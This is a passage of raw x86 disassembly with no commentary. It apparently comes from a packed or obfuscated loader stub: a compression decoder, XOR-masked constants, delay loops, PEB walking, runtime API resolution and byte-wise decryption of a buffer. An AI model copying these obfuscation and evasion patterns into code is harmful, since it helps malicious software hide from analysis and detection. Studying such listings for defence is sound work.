  41b34a:	inc    DWORD PTR [ebp-0x24]
  41b34d:	sub    DWORD PTR [ebp-0x20],ebx
  41b350:	dec    esi
  41b351:	jne    0x41b33b
  41b353:	mov    eax,0x644
  41b358:	add    eax,DWORD PTR [ebp-0x38]
  41b35b:	mov    DWORD PTR [ebp-0x34],eax
  41b35e:	shl    DWORD PTR [ebp-0x24],0x4
  41b362:	push   0x4
  41b364:	pop    esi
  41b365:	sub    edi,edi
  41b367:	inc    edi
  41b368:	mov    eax,edi
  41b36a:	mov    ebp,DWORD PTR [ebp-0x34]
  41b36d:	call   0x41b428
  41b372:	test   al,0x1
  41b374:	je     0x41b379
  41b376:	or     DWORD PTR [ebp-0x24],edi
  41b379:	shl    edi,1
  41b37b:	dec    esi
  41b37c:	jne    0x41b36a
  41b37e:	jmp    0x41b380
  41b380:	inc    DWORD PTR [ebp-0x24]
  41b383:	mov    ecx,DWORD PTR [ebp-0x1c]
  41b386:	add    ecx,0x2
  41b389:	mov    edi,DWORD PTR [ebp-0x4]
  41b38c:	mov    eax,edi
  41b38e:	sub    eax,DWORD PTR [ebp+0x24]
  41b391:	cmp    DWORD PTR [ebp-0x24],eax
  41b394:	ja     0x41b3e0
  41b396:	mov    esi,edi
  41b398:	sub    esi,DWORD PTR [ebp-0x24]
  41b39b:	mov    edx,DWORD PTR [ebp+0x28]
  41b39e:	lods   al,BYTE PTR ds:[esi]
  41b39f:	stos   BYTE PTR es:[edi],al
  41b3a0:	cmp    edi,edx
  41b3a2:	jae    0x41b3a7
  41b3a4:	dec    ecx
  41b3a5:	jne    0x41b39e
  41b3a7:	mov    DWORD PTR [ebp-0x4],edi
  41b3aa:	movzx  esi,al
  41b3ad:	cmp    edi,DWORD PTR [ebp+0x28]
  41b3b0:	jb     0x41b111
  41b3b6:	call   0x41b3e5
  41b3bb:	sub    eax,eax
  41b3bd:	lea    ebp,[esp+0x3c]
  41b3c1:	mov    edx,DWORD PTR [ebp+0x20]
  41b3c4:	mov    esi,DWORD PTR [ebp-0x8]
  41b3c7:	sub    esi,DWORD PTR [ebp+0x18]
  41b3ca:	mov    DWORD PTR [edx],esi
  41b3cc:	mov    edx,DWORD PTR [ebp+0x2c]
  41b3cf:	mov    edi,DWORD PTR [ebp-0x4]
  41b3d2:	sub    edi,DWORD PTR [ebp+0x24]
  41b3d5:	mov    DWORD PTR [edx],edi
  41b3d7:	leave  
  41b3d8:	pop    ebx
  41b3d9:	pop    esi
  41b3da:	pop    edi
  41b3db:	ret    0x1c
  41b3de:	pop    esi
  41b3df:	pop    eax
  41b3e0:	sub    eax,eax
  41b3e2:	inc    eax
  41b3e3:	jmp    0x41b3bd
  41b3e5:	cmp    ebx,0x1000000
  41b3eb:	jb     0x41b3ee
  41b3ed:	ret    
  41b3ee:	shl    ebx,0x8
  41b3f1:	push   esi
  41b3f2:	mov    esi,DWORD PTR [ebp-0x8]
  41b3f5:	cmp    esi,DWORD PTR [ebp+0x1c]
  41b3f8:	jae    0x41b3de
  41b3fa:	mov    eax,DWORD PTR [ebp-0x20]
  41b3fd:	shl    eax,0x8
  41b400:	lods   al,BYTE PTR ds:[esi]
  41b401:	mov    DWORD PTR [ebp-0x20],eax
  41b404:	mov    DWORD PTR [ebp-0x8],esi
  41b407:	pop    esi
  41b408:	ret    
  41b409:	mov    ecx,DWORD PTR [ebp-0x3c]
  41b40c:	movzx  eax,al
  41b40f:	shl    ecx,0x4
  41b412:	add    eax,DWORD PTR [ebp-0x18]
  41b415:	add    eax,ecx
  41b417:	jmp    0x41b41f
  41b419:	movzx  eax,al
  41b41c:	add    eax,DWORD PTR [ebp-0x3c]
  41b41f:	mov    ebp,DWORD PTR [ebp-0x38]
  41b422:	lea    ebp,[ebp+eax*2+0x0]
  41b426:	sub    eax,eax
  41b428:	lea    ebp,[ebp+eax*2+0x0]
  41b42c:	cmp    ebx,0x1000000
  41b432:	jae    0x41b450
  41b434:	mov    ecx,DWORD PTR [esp+0x38]
  41b438:	shl    DWORD PTR [esp+0x20],0x8
  41b43d:	cmp    ecx,DWORD PTR [esp+0x5c]
  41b441:	jae    0x41b3df
  41b443:	mov    dl,BYTE PTR [ecx]
  41b445:	inc    DWORD PTR [esp+0x38]
  41b449:	shl    ebx,0x8
  41b44c:	mov    BYTE PTR [esp+0x20],dl
  41b450:	mov    ecx,ebx
  41b452:	movzx  edx,WORD PTR [ebp+0x0]
  41b456:	shr    ecx,0xb
  41b459:	imul   ecx,edx
  41b45c:	cmp    DWORD PTR [esp+0x20],ecx
  41b460:	jae    0x41b479
  41b462:	mov    ebx,ecx
  41b464:	mov    ecx,0x800
  41b469:	sub    ecx,edx
  41b46b:	shr    ecx,0x5
  41b46e:	add    WORD PTR [ebp+0x0],cx
  41b472:	add    eax,eax
  41b474:	lea    ebp,[esp+0x40]
  41b478:	ret    
  41b479:	shr    edx,0x5
  41b47c:	sub    DWORD PTR [esp+0x20],ecx
  41b480:	sub    ebx,ecx
  41b482:	sub    WORD PTR [ebp+0x0],dx
  41b486:	add    eax,eax
  41b488:	add    eax,0x1
  41b48b:	lea    ebp,[esp+0x40]
  41b48f:	ret    
  41b490:	push   ebp
  41b491:	mov    ebp,esp
  41b493:	sub    esp,0x104
  41b499:	push   ebx
  41b49a:	push   esi
  41b49b:	push   edi
  41b49c:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  41b4a3:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  41b4aa:	mov    eax,DWORD PTR [ebp+0x8]
  41b4ad:	mov    DWORD PTR [ebp+0x8],eax
  41b4b0:	mov    ecx,DWORD PTR [ebp-0x14]
  41b4b3:	mov    ebx,0x7510899
  41b4b8:	xor    ecx,ebx
  41b4ba:	mov    eax,0x3272e0
  41b4bf:	add    ecx,eax
  41b4c1:	mov    DWORD PTR [ebp-0x28],ecx
  41b4c4:	mov    ecx,DWORD PTR [ebp-0x14]
  41b4c7:	xor    ecx,ebx
  41b4c9:	add    ecx,eax
  41b4cb:	mov    DWORD PTR [ebp-0x40],ecx
  41b4ce:	mov    ecx,DWORD PTR [ebp-0x14]
  41b4d1:	xor    ecx,ebx
  41b4d3:	add    ecx,eax
  41b4d5:	mov    DWORD PTR [ebp-0x3c],ecx
  41b4d8:	mov    ecx,DWORD PTR [ebp-0x14]
  41b4db:	xor    ecx,ebx
  41b4dd:	add    ecx,eax
  41b4df:	mov    DWORD PTR [ebp-0xa0],ecx
  41b4e5:	mov    DWORD PTR [ebp-0x50],0xf89f05b9
  41b4ec:	mov    DWORD PTR [ebp-0x3c],0xf89cb5b9
  41b4f3:	mov    DWORD PTR [ebp-0x4c],0xf89c85bd
  41b4fa:	push   0x25
  41b4fc:	pop    ecx
  41b4fd:	mov    DWORD PTR [ebp-0x2c],ecx
  41b500:	mov    DWORD PTR [ebp-0x2c],ecx
  41b503:	push   0x65
  41b505:	pop    ecx
  41b506:	mov    DWORD PTR [ebp-0x2c],ecx
  41b509:	mov    DWORD PTR [ebp-0x2c],ecx
  41b50c:	mov    DWORD PTR [ebp-0x2c],0x4d
  41b513:	mov    DWORD PTR [ebp-0x2c],0x43
  41b51a:	mov    ecx,DWORD PTR [ebp-0x14]
  41b51d:	xor    ecx,ebx
  41b51f:	add    ecx,eax
  41b521:	mov    DWORD PTR [ebp-0x2c],ecx
  41b524:	mov    ecx,DWORD PTR [ebp-0x14]
  41b527:	xor    ecx,ebx
  41b529:	add    ecx,eax
  41b52b:	mov    DWORD PTR [ebp-0x2c],ecx
  41b52e:	mov    DWORD PTR [ebp-0x24],0x257
  41b535:	mov    DWORD PTR [ebp-0x34],0x35
  41b53c:	mov    DWORD PTR [ebp-0x10],0x79
  41b543:	lea    edi,[ebp-0xe4]
  41b549:	lea    esi,[ebp-0x104]
  41b54f:	call   0x41c169
  41b554:	dec    DWORD PTR [ebp-0x10]
  41b557:	jne    0x41b543
  41b559:	dec    DWORD PTR [ebp-0x34]
  41b55c:	jne    0x41b53c
  41b55e:	dec    DWORD PTR [ebp-0x24]
  41b561:	jne    0x41b535
  41b563:	mov    DWORD PTR [ebp-0x24],0x400d
  41b56a:	mov    eax,DWORD PTR [ebp-0x14]
  41b56d:	xor    eax,ebx
  41b56f:	mov    esi,0x3272e0
  41b574:	add    eax,esi
  41b576:	mov    DWORD PTR [ebp-0x8],eax
  41b579:	mov    eax,DWORD PTR [ebp-0x14]
  41b57c:	and    DWORD PTR [ebp-0x94],0x0
  41b583:	xor    eax,ebx
  41b585:	add    eax,esi
  41b587:	mov    DWORD PTR [ebp-0x38],eax
  41b58a:	mov    eax,fs:0x18
  41b590:	mov    DWORD PTR [ebp-0x94],eax
  41b596:	mov    eax,DWORD PTR [eax+0x30]
  41b599:	mov    DWORD PTR [ebp-0x98],eax
  41b59f:	mov    eax,DWORD PTR [eax+0xc]
  41b5a2:	mov    DWORD PTR [ebp-0xc0],eax
  41b5a8:	mov    eax,DWORD PTR [ebp+0x8]
  41b5ab:	lea    ecx,[ebp-0x94]
  41b5b1:	mov    DWORD PTR [eax+0x1a0],ecx
  41b5b7:	mov    eax,DWORD PTR [ebp+0x8]
  41b5ba:	lea    ecx,[ebp-0x98]
  41b5c0:	mov    DWORD PTR [eax+0x1a4],ecx
  41b5c6:	mov    eax,DWORD PTR [ebp+0x8]
  41b5c9:	push   DWORD PTR [ebp+0x8]
  41b5cc:	lea    ecx,[ebp-0xc0]
  41b5d2:	mov    DWORD PTR [eax+0x1a8],ecx
  41b5d8:	call   0x41d94f
  41b5dd:	mov    ecx,DWORD PTR [ebp-0x14]
  41b5e0:	xor    ecx,ebx
  41b5e2:	add    ecx,esi
  41b5e4:	cmp    ecx,eax
  41b5e6:	je     0x41b8c3
  41b5ec:	mov    eax,DWORD PTR [ebp+0x8]
  41b5ef:	mov    eax,DWORD PTR [eax+0x194]
  41b5f5:	mov    ecx,DWORD PTR [eax]
  41b5f7:	mov    eax,DWORD PTR [ebp+0x8]
  41b5fa:	mov    eax,DWORD PTR [eax+0x194]
  41b600:	mov    eax,DWORD PTR [eax]
  41b602:	add    eax,DWORD PTR [ecx+0x3c]
  41b605:	mov    ecx,DWORD PTR [ebp+0x8]
  41b608:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41b60e:	lea    edx,[ebp-0xc4]
  41b614:	push   edx
  41b615:	mov    edx,DWORD PTR [ebp+0x8]
  41b618:	mov    edx,DWORD PTR [edx+0x18c]
  41b61e:	mov    edx,DWORD PTR [edx]
  41b620:	add    edx,DWORD PTR [eax+0x88]
  41b626:	push   0x4
  41b628:	push   DWORD PTR [eax+0x8c]
  41b62e:	push   edx
  41b62f:	call   DWORD PTR [ecx+0x1c]
  41b632:	push   DWORD PTR [ebp+0x8]
  41b635:	mov    edi,DWORD PTR [ebp+0x8]
  41b638:	mov    eax,DWORD PTR [ebp+0x8]
  41b63b:	mov    edx,DWORD PTR [eax+0x1b8]
  41b641:	mov    DWORD PTR [ebp-0x68],0x80e0f06
  41b648:	mov    DWORD PTR [ebp-0x64],0x10a051f
  41b64f:	mov    WORD PTR [ebp-0x60],0x7a39
  41b655:	mov    DWORD PTR [ebp-0x90],0x23f0f21
  41b65f:	mov    DWORD PTR [ebp-0x8c],0x6390819
  41b669:	mov    DWORD PTR [ebp-0x88],0x2419020a
  41b673:	mov    DWORD PTR [ebp-0x84],0x81d050d
  41b67d:	mov    DWORD PTR [ebp-0x80],0x7a391f01
  41b684:	mov    DWORD PTR [ebp-0x7c],0x23f0f21
  41b68b:	mov    DWORD PTR [ebp-0x78],0x6390819
  41b692:	mov    DWORD PTR [ebp-0x74],0x2419020a
  41b699:	mov    DWORD PTR [ebp-0x70],0x81d050d
  41b6a0:	mov    DWORD PTR [ebp-0x6c],0x7a131f01
  41b6a7:	call   0x41d97e
  41b6ac:	push   eax
  41b6ad:	mov    eax,DWORD PTR [ebp+0x8]
  41b6b0:	mov    eax,DWORD PTR [eax+0x1a8]
  41b6b6:	push   DWORD PTR [eax]
  41b6b8:	call   0x41d61f
  41b6bd:	test   eax,eax
  41b6bf:	jne    0x41b711
  41b6c1:	mov    eax,DWORD PTR [ebp+0x8]
  41b6c4:	mov    eax,DWORD PTR [eax+0x1d8]
  41b6ca:	mov    edi,DWORD PTR [ebp+0x8]
  41b6cd:	add    eax,0x4
  41b6d0:	mov    DWORD PTR [ebp-0x20],eax
  41b6d3:	mov    eax,DWORD PTR [ebp+0x8]
  41b6d6:	mov    edx,DWORD PTR [eax+0x1b8]
  41b6dc:	call   0x41d97e
  41b6e1:	push   eax
  41b6e2:	mov    eax,DWORD PTR [ebp-0x20]
  41b6e5:	call   DWORD PTR [eax]
  41b6e7:	test   eax,eax
  41b6e9:	jne    0x41b711
  41b6eb:	mov    eax,DWORD PTR [ebp+0x8]
  41b6ee:	mov    eax,DWORD PTR [eax+0x1d8]
  41b6f4:	mov    edi,DWORD PTR [ebp+0x8]
  41b6f7:	add    eax,0x10
  41b6fa:	mov    DWORD PTR [ebp-0x20],eax
  41b6fd:	mov    eax,DWORD PTR [ebp+0x8]
  41b700:	mov    edx,DWORD PTR [eax+0x1b8]
  41b706:	call   0x41d97e
  41b70b:	push   eax
  41b70c:	mov    eax,DWORD PTR [ebp-0x20]
  41b70f:	call   DWORD PTR [eax]
  41b711:	mov    eax,DWORD PTR [ebp-0x14]
  41b714:	mov    ecx,DWORD PTR [ebp-0x24]
  41b717:	xor    eax,ebx
  41b719:	add    eax,esi
  41b71b:	cmp    eax,ecx
  41b71d:	je     0x41b89c
  41b723:	mov    eax,DWORD PTR [ebp-0x18]
  41b726:	xor    eax,ebx
  41b728:	mov    ecx,0xffcd8d20
  41b72d:	sub    ecx,eax
  41b72f:	add    ecx,DWORD PTR [ebp-0x24]
  41b732:	mov    eax,DWORD PTR [ebp-0x8]
  41b735:	cmp    eax,ecx
  41b737:	ja     0x41b89c
  41b73d:	mov    DWORD PTR [ebp-0x34],0x0
  41b744:	push   DWORD PTR [ebp+0x8]
  41b747:	mov    edi,DWORD PTR [ebp+0x8]
  41b74a:	mov    eax,DWORD PTR [ebp+0x8]
  41b74d:	mov    edx,DWORD PTR [eax+0x1b4]
  41b753:	call   0x41d97e
  41b758:	push   eax
  41b759:	mov    eax,DWORD PTR [ebp+0x8]
  41b75c:	mov    eax,DWORD PTR [eax+0x1a8]
  41b762:	push   DWORD PTR [eax]
  41b764:	call   0x41d61f
  41b769:	mov    ecx,DWORD PTR [ebp+0x8]
  41b76c:	mov    ecx,DWORD PTR [ecx+0x19c]
  41b772:	mov    DWORD PTR [ecx],eax
  41b774:	mov    eax,DWORD PTR [ebp+0x8]
  41b777:	mov    edi,DWORD PTR [eax+0x1d8]
  41b77d:	mov    esi,DWORD PTR [ebp+0x8]
  41b780:	xor    eax,eax
  41b782:	lea    edx,[ebp-0x7c]
  41b785:	call   0x41d9b4
  41b78a:	push   eax
  41b78b:	mov    eax,DWORD PTR [ebp+0x8]
  41b78e:	mov    eax,DWORD PTR [eax+0x19c]
  41b794:	push   DWORD PTR [eax]
  41b796:	call   DWORD PTR [edi+0x8]
  41b799:	mov    DWORD PTR [ebp-0x20],eax
  41b79c:	mov    eax,DWORD PTR [ebp+0x8]
  41b79f:	mov    edi,DWORD PTR [eax+0x1d8]
  41b7a5:	mov    esi,DWORD PTR [ebp+0x8]
  41b7a8:	xor    eax,eax
  41b7aa:	lea    edx,[ebp-0x90]
  41b7b0:	call   0x41d9b4
  41b7b5:	push   eax
  41b7b6:	mov    eax,DWORD PTR [ebp+0x8]
  41b7b9:	mov    eax,DWORD PTR [eax+0x19c]
  41b7bf:	push   DWORD PTR [eax]
  41b7c1:	call   DWORD PTR [edi+0x8]
  41b7c4:	and    DWORD PTR [ebp-0x1c],0x0
  41b7c8:	mov    eax,DWORD PTR [ebp-0x1c]
  41b7cb:	and    eax,0x7
  41b7ce:	add    eax,0x31
  41b7d1:	push   eax
  41b7d2:	call   DWORD PTR [ebp-0x20]
  41b7d5:	test   eax,eax
  41b7d7:	jne    0x41b7de
  41b7d9:	and    DWORD PTR [ebp-0x10],eax
  41b7dc:	jmp    0x41b806
  41b7de:	mov    eax,DWORD PTR [ebp+0x8]
  41b7e1:	mov    edi,DWORD PTR [eax+0x1d8]
  41b7e7:	mov    esi,DWORD PTR [ebp+0x8]
  41b7ea:	xor    eax,eax
  41b7ec:	lea    edx,[ebp-0x68]
  41b7ef:	call   0x41d9b4
  41b7f4:	push   eax
  41b7f5:	mov    eax,DWORD PTR [ebp+0x8]
  41b7f8:	mov    eax,DWORD PTR [eax+0x198]
  41b7fe:	push   DWORD PTR [eax]
  41b800:	call   DWORD PTR [edi+0x8]
  41b803:	mov    DWORD PTR [ebp-0x10],eax
  41b806:	inc    DWORD PTR [ebp-0x1c]
  41b809:	cmp    DWORD PTR [ebp-0x1c],0x10
  41b80d:	jb     0x41b7c8
  41b80f:	mov    eax,DWORD PTR [ebp-0x18]
  41b812:	mov    esi,DWORD PTR [ebp+0x8]
  41b815:	xor    eax,ebx
  41b817:	mov    edi,0x3272e0
  41b81c:	add    eax,edi
  41b81e:	lea    edx,[ebp-0xe4]
  41b824:	call   0x41d9b4
  41b829:	push   eax
  41b82a:	mov    eax,DWORD PTR [ebp-0x14]
  41b82d:	mov    esi,DWORD PTR [ebp+0x8]
  41b830:	xor    eax,ebx
  41b832:	add    eax,edi
  41b834:	lea    edx,[ebp-0x104]
  41b83a:	call   0x41d9b4
  41b83f:	push   eax
  41b840:	call   DWORD PTR [ebp-0x10]
  41b843:	mov    ecx,DWORD PTR [ebp-0x14]
  41b846:	xor    ecx,ebx
  41b848:	add    ecx,edi
  41b84a:	cmp    ecx,eax
  41b84c:	jne    0x41b855
  41b84e:	mov    DWORD PTR [ebp-0x34],0x1
  41b855:	mov    eax,DWORD PTR [ebp-0x18]
  41b858:	mov    ecx,DWORD PTR [ebp-0x8]
  41b85b:	xor    eax,ebx
  41b85d:	lea    eax,[eax+ecx*1+0x3272e0]
  41b864:	mov    DWORD PTR [ebp-0x8],eax
  41b867:	mov    eax,DWORD PTR [ebp-0x34]
  41b86a:	test   eax,eax
  41b86c:	je     0x41b880
  41b86e:	mov    eax,DWORD PTR [ebp-0x18]
  41b871:	mov    ecx,DWORD PTR [ebp-0x38]
  41b874:	xor    eax,ebx
  41b876:	lea    eax,[eax+ecx*1+0x3272e0]
  41b87d:	mov    DWORD PTR [ebp-0x38],eax
  41b880:	mov    eax,DWORD PTR [ebp-0x18]
  41b883:	xor    eax,ebx
  41b885:	mov    ecx,0xffcd8d20
  41b88a:	sub    ecx,eax
  41b88c:	add    ecx,DWORD PTR [ebp-0x24]
  41b88f:	mov    eax,DWORD PTR [ebp-0x8]
  41b892:	cmp    eax,ecx
  41b894:	jbe    0x41b73d
  41b89a:	mov    esi,edi
  41b89c:	mov    eax,DWORD PTR [ebp-0x38]
  41b89f:	mov    ecx,DWORD PTR [ebp-0x8]
  41b8a2:	cmp    ecx,eax
  41b8a4:	jne    0x41b8b7
  41b8a6:	push   DWORD PTR [ebp+0x8]
  41b8a9:	lea    eax,[ebp-0x40]
  41b8ac:	push   eax
  41b8ad:	call   0x41e42c
  41b8b2:	mov    DWORD PTR [ebp-0x28],eax
  41b8b5:	jmp    0x41b8c3
  41b8b7:	mov    eax,DWORD PTR [ebp-0x28]
  41b8ba:	mov    ecx,DWORD PTR [ebp-0x18]
  41b8bd:	xor    ecx,ebx
  41b8bf:	add    ecx,esi
  41b8c1:	xor    DWORD PTR [eax],ecx
  41b8c3:	mov    eax,DWORD PTR [ebp-0x14]
  41b8c6:	mov    ecx,DWORD PTR [ebp-0x28]
  41b8c9:	xor    eax,ebx
  41b8cb:	add    eax,esi
  41b8cd:	cmp    eax,ecx
  41b8cf:	je     0x41c047
  41b8d5:	mov    eax,DWORD PTR [ebp-0x14]
  41b8d8:	mov    ecx,DWORD PTR [ebp-0x40]
  41b8db:	xor    eax,ebx
  41b8dd:	add    eax,esi
  41b8df:	cmp    eax,ecx
  41b8e1:	je     0x41c047
  41b8e7:	mov    eax,DWORD PTR [ebp-0x14]
  41b8ea:	xor    eax,ebx
  41b8ec:	add    eax,esi
  41b8ee:	jmp    0x41b90c
  41b8f0:	mov    edi,DWORD PTR [ebp-0x28]
  41b8f3:	mov    cl,al
  41b8f5:	and    cl,0x1f
  41b8f8:	or     dl,0xff
  41b8fb:	sub    dl,cl
  41b8fd:	add    BYTE PTR [edi+eax*1],dl
  41b900:	mov    ecx,DWORD PTR [ebp-0x18]
  41b903:	xor    ecx,ebx
  41b905:	lea    eax,[eax+ecx*1+0x3272e0]
  41b90c:	mov    ecx,DWORD PTR [ebp-0x40]
  41b90f:	cmp    eax,ecx
  41b911:	jb     0x41b8f0
  41b913:	mov    eax,DWORD PTR [ebp-0x40]
  41b916:	mov    DWORD PTR [ebp-0x24],eax
  41b919:	mov    eax,DWORD PTR [ebp-0x28]
  41b91c:	mov    DWORD PTR [ebp-0x38],0xf89c85b9
  41b923:	mov    DWORD PTR [ebp-0xbc],eax
  41b929:	mov    edi,0xf89c85b8
  41b92e:	mov    DWORD PTR [ebp-0x30],edi
  41b931:	mov    eax,DWORD PTR [ebp-0x38]
  41b934:	xor    eax,ebx
  41b936:	add    eax,esi
  41b938:	mov    DWORD PTR [ebp-0xc],eax
  41b93b:	mov    eax,DWORD PTR [ebp-0x38]
  41b93e:	xor    eax,ebx
  41b940:	add    eax,esi
  41b942:	mov    DWORD PTR [ebp-0x8],eax
  41b945:	mov    DWORD PTR [ebp-0x48],0xf89c85d9
  41b94c:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  41b953:	mov    eax,DWORD PTR [ebp-0x38]
  41b956:	mov    ecx,DWORD PTR [ebp-0x24]
  41b959:	xor    eax,ebx
  41b95b:	add    eax,esi
  41b95d:	cmp    ecx,eax
  41b95f:	je     0x41bb5e
  41b965:	jmp    0x41bb3a
  41b96a:	mov    ecx,DWORD PTR [ebp-0xc]
  41b96d:	mov    eax,DWORD PTR [ebp-0x24]
  41b970:	sub    eax,ecx
  41b972:	mov    ecx,DWORD PTR [ebp-0x48]
  41b975:	xor    ecx,ebx
  41b977:	add    ecx,esi
  41b979:	xor    edx,edx
  41b97b:	div    ecx
  41b97d:	mov    DWORD PTR [ebp-0x8],eax
  41b980:	mov    eax,DWORD PTR [ebp-0x54]
  41b983:	mov    ecx,DWORD PTR [ebp-0x8]
  41b986:	xor    eax,ebx
  41b988:	add    eax,esi
  41b98a:	cmp    ecx,eax
  41b98c:	jbe    0x41b998
  41b98e:	mov    eax,DWORD PTR [ebp-0x54]
  41b991:	xor    eax,ebx
  41b993:	add    eax,esi
  41b995:	mov    DWORD PTR [ebp-0x8],eax
  41b998:	mov    eax,DWORD PTR [ebp-0x48]
  41b99b:	mov    ecx,DWORD PTR [ebp-0x8]
  41b99e:	xor    eax,ebx
  41b9a0:	add    eax,esi
  41b9a2:	imul   eax,ecx
  41b9a5:	mov    DWORD PTR [ebp-0x8],eax
  41b9a8:	mov    eax,DWORD PTR [ebp-0x38]
  41b9ab:	mov    ecx,DWORD PTR [ebp-0x8]
  41b9ae:	xor    eax,ebx
  41b9b0:	add    eax,esi
  41b9b2:	cmp    ecx,eax
  41b9b4:	je     0x41bb28
  41b9ba:	mov    eax,DWORD PTR [ebp-0x8]
  41b9bd:	mov    DWORD PTR [ebp-0x10],eax
  41b9c0:	mov    eax,DWORD PTR [ebp-0xc]
  41b9c3:	add    eax,DWORD PTR [ebp-0xbc]
  41b9c9:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  41b9d0:	mov    DWORD PTR [ebp-0x34],edi
  41b9d3:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  41b9dd:	mov    DWORD PTR [ebp-0x8],eax
  41b9e0:	mov    DWORD PTR [ebp-0x2c],0xf89c85ba
  41b9e7:	mov    DWORD PTR [ebp-0x1c],edi
  41b9ea:	mov    eax,DWORD PTR [ebp-0x20]
  41b9ed:	xor    eax,ebx
  41b9ef:	add    eax,esi
  41b9f1:	jmp    0x41bae7
  41b9f6:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  41ba00:	mov    DWORD PTR [ebp-0xb8],0xf89c85ad
  41ba0a:	mov    eax,DWORD PTR [ebp-0x1c]
  41ba0d:	mov    ecx,DWORD PTR [ebp-0x44]
  41ba10:	xor    eax,ebx
  41ba12:	add    eax,esi
  41ba14:	imul   eax,ecx
  41ba17:	mov    ecx,DWORD PTR [ebp-0x8]
  41ba1a:	mov    al,BYTE PTR [eax+ecx*1]
  41ba1d:	mov    BYTE PTR [ebp-0x2],al
  41ba20:	mov    eax,DWORD PTR [ebp-0x1c]
  41ba23:	mov    ecx,DWORD PTR [ebp-0x44]
  41ba26:	xor    eax,ebx
  41ba28:	add    eax,esi
  41ba2a:	imul   eax,ecx
  41ba2d:	mov    ecx,DWORD PTR [ebp-0xa8]
  41ba33:	xor    ecx,ebx
  41ba35:	add    eax,ecx
  41ba37:	mov    ecx,DWORD PTR [ebp-0x8]
  41ba3a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  41ba42:	mov    ecx,DWORD PTR [ebp-0xb0]
  41ba48:	xor    ecx,ebx
  41ba4a:	lea    eax,[ecx+eax*1+0x3272e0]
  41ba51:	movzx  ecx,BYTE PTR [ebp-0x2]
  41ba55:	xor    ecx,eax
  41ba57:	mov    BYTE PTR [ebp-0x2],cl
  41ba5a:	mov    al,BYTE PTR [ebp-0x2]
  41ba5d:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ba60:	mov    edx,DWORD PTR [ebp-0x44]
  41ba63:	xor    ecx,ebx
  41ba65:	add    ecx,esi
  41ba67:	imul   ecx,edx
  41ba6a:	mov    edx,DWORD PTR [ebp-0x8]
  41ba6d:	mov    BYTE PTR [ecx+edx*1],al
  41ba70:	mov    eax,DWORD PTR [ebp-0x1c]
  41ba73:	mov    ecx,DWORD PTR [ebp-0x44]
  41ba76:	xor    eax,ebx
  41ba78:	add    eax,esi
  41ba7a:	imul   eax,ecx
  41ba7d:	mov    ecx,DWORD PTR [ebp-0x8]
  41ba80:	mov    al,BYTE PTR [eax+ecx*1]
  41ba83:	mov    BYTE PTR [ebp-0x2],al
  41ba86:	mov    eax,DWORD PTR [ebp-0x1c]
  41ba89:	mov    ecx,DWORD PTR [ebp-0x44]
  41ba8c:	xor    eax,ebx
  41ba8e:	add    eax,esi
  41ba90:	imul   eax,ecx
  41ba93:	mov    ecx,DWORD PTR [ebp-0x34]
  41ba96:	xor    ecx,ebx
  41ba98:	add    eax,ecx
  41ba9a:	mov    ecx,DWORD PTR [ebp-0x8]
  41ba9d:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  41baa5:	mov    ecx,DWORD PTR [ebp-0xb8]
  41baab:	xor    ecx,ebx
  41baad:	lea    eax,[ecx+eax*1+0x3272e0]
  41bab4:	movzx  ecx,BYTE PTR [ebp-0x2]
  41bab8:	xor    ecx,eax
  41baba:	mov    BYTE PTR [ebp-0x2],cl
  41babd:	mov    al,BYTE PTR [ebp-0x2]
  41bac0:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bac3:	mov    edx,DWORD PTR [ebp-0x44]
  41bac6:	xor    ecx,ebx
  41bac8:	add    ecx,esi
  41baca:	imul   ecx,edx
  41bacd:	mov    edx,DWORD PTR [ebp-0x8]
  41bad0:	mov    BYTE PTR [ecx+edx*1],al
  41bad3:	mov    eax,DWORD PTR [ebp-0x2c]
  41bad6:	mov    ecx,DWORD PTR [ebp-0x34]
  41bad9:	xor    eax,ebx
  41badb:	xor    ecx,ebx
  41badd:	add    eax,esi
  41badf:	add    ecx,esi
  41bae1:	imul   eax,ecx
  41bae4:	add    eax,DWORD PTR [ebp-0x44]
  41bae7:	mov    DWORD PTR [ebp-0x44],eax
  41baea:	mov    eax,DWORD PTR [ebp-0x44]
  41baed:	mov    ecx,DWORD PTR [ebp-0x10]
  41baf0:	cmp    ecx,eax
  41baf2:	jb     0x41b9f6
  41baf8:	mov    eax,DWORD PTR [ebp-0x34]
  41bafb:	mov    ecx,DWORD PTR [ebp-0x10]
  41bafe:	xor    eax,ebx
  41bb00:	add    eax,esi
  41bb02:	imul   eax,ecx
  41bb05:	mov    ecx,DWORD PTR [ebp-0x20]
  41bb08:	xor    ecx,ebx
  41bb0a:	add    ecx,esi
  41bb0c:	or     eax,ecx
  41bb0e:	mov    ecx,DWORD PTR [ebp-0x30]
  41bb11:	xor    ecx,ebx
  41bb13:	add    eax,ecx
  41bb15:	mov    ecx,DWORD PTR [ebp-0x30]
  41bb18:	xor    ecx,ebx
  41bb1a:	add    eax,ecx
  41bb1c:	mov    ecx,DWORD PTR [ebp-0xc]
  41bb1f:	lea    eax,[eax+ecx*1+0x64e5c0]
  41bb26:	jmp    0x41bb37
  41bb28:	mov    eax,DWORD PTR [ebp-0x30]
  41bb2b:	mov    ecx,DWORD PTR [ebp-0xc]
  41bb2e:	xor    eax,ebx
  41bb30:	lea    eax,[eax+ecx*1+0x3272e0]
  41bb37:	mov    DWORD PTR [ebp-0xc],eax
  41bb3a:	mov    eax,DWORD PTR [ebp-0x30]
  41bb3d:	xor    eax,ebx
  41bb3f:	mov    ecx,0xffcd8d20
  41bb44:	sub    ecx,eax
  41bb46:	add    ecx,DWORD PTR [ebp-0x24]
  41bb49:	mov    eax,DWORD PTR [ebp-0x30]
  41bb4c:	mov    edx,DWORD PTR [ebp-0xc]
  41bb4f:	xor    eax,ebx
  41bb51:	add    eax,esi
  41bb53:	imul   eax,edx
  41bb56:	cmp    eax,ecx
  41bb58:	jbe    0x41b96a
  41bb5e:	mov    eax,DWORD PTR [ebp-0x14]
  41bb61:	mov    ecx,DWORD PTR [ebp-0x40]
